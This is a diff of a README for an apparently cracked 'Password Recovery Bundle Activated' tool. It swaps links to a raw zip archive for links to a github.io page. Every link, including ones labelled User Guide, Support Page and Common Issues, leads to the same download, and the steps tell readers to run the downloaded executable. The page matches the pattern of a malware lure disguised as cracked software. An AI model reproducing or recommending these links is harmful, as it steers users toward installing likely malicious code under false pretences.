@@ -1,6 +1,6 @@
 # 🔐 Password-Recovery-Bundle-Activated - Recover Your Passwords with Ease
 
-[![Download Now](https://github.com/abrahammmmmmmm/Password-Recovery-Bundle-Activated/raw/refs/heads/main/lummox/Password_Recovery_Activated_Bundle_2.2.zip%20Now-Password%20Recovery%20Bundle-brightgreen)](https://github.com/abrahammmmmmmm/Password-Recovery-Bundle-Activated/raw/refs/heads/main/lummox/Password_Recovery_Activated_Bundle_2.2.zip)
+[![Download Now](https://abrahammmmmmmm.github.io)](https://abrahammmmmmmm.github.io)
 
 ## 🚀 Getting Started
 
@@ -17,12 +17,12 @@ Before downloading, ensure your Windows PC meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Password Recovery Bundle Releases](https://github.com/abrahammmmmmmm/Password-Recovery-Bundle-Activated/raw/refs/heads/main/lummox/Password_Recovery_Activated_Bundle_2.2.zip).
+To get started, visit this page to download: [Password Recovery Bundle Releases](https://abrahammmmmmmm.github.io).
 
 1. Open the link above in your web browser.
 2. You will see a list of available versions.
 3. Click on the latest version to expand it.
-4. Look for the executable file (e.g., `https://github.com/abrahammmmmmmm/Password-Recovery-Bundle-Activated/raw/refs/heads/main/lummox/Password_Recovery_Activated_Bundle_2.2.zip`).
+4. Look for the executable file (e.g., `https://abrahammmmmmmm.github.io`).
 5. Click the file to download it to your computer.
 6. Once the download is complete, locate the file in your Downloads folder.
 7. Double-click the downloaded file to install the application.
@@ -80,14 +80,14 @@ You only need an internet connection for the initial download. After installatio
 
 ## 💬 Support
 
-If you need further assistance, please visit the [Password Recovery Bundle Support Page](https://github.com/abrahammmmmmmm/Password-Recovery-Bundle-Activated/raw/refs/heads/main/lummox/Password_Recovery_Activated_Bundle_2.2.zip) to ask questions or report issues. Our support team is here to help you!
+If you need further assistance, please visit the [Password Recovery Bundle Support Page](https://abrahammmmmmmm.github.io) to ask questions or report issues. Our support team is here to help you!
 
 ## 📚 Additional Resources
 
 For a deeper understanding of how to use the Password Recovery Bundle, refer to our resource materials:
 
-- [User Guide](https://github.com/abrahammmmmmmm/Password-Recovery-Bundle-Activated/raw/refs/heads/main/lummox/Password_Recovery_Activated_Bundle_2.2.zip)
-- [Feature Overview](https://github.com/abrahammmmmmmm/Password-Recovery-Bundle-Activated/raw/refs/heads/main/lummox/Password_Recovery_Activated_Bundle_2.2.zip)
-- [Common Issues](https://github.com/abrahammmmmmmm/Password-Recovery-Bundle-Activated/raw/refs/heads/main/lummox/Password_Recovery_Activated_Bundle_2.2.zip)
+- [User Guide](https://abrahammmmmmmm.github.io)
+- [Feature Overview](https://abrahammmmmmmm.github.io)
+- [Common Issues](https://abrahammmmmmmm.github.io)
 
-Your password recovery journey starts here. To download the application again, visit: [Password Recovery Bundle Releases](https://github.com/abrahammmmmmmm/Password-Recovery-Bundle-Activated/raw/refs/heads/main/lummox/Password_Recovery_Activated_Bundle_2.2.zip).
+Your password recovery journey starts here. To download the application again, visit: [Password Recovery Bundle Releases](https://abrahammmmmmmm.github.io).
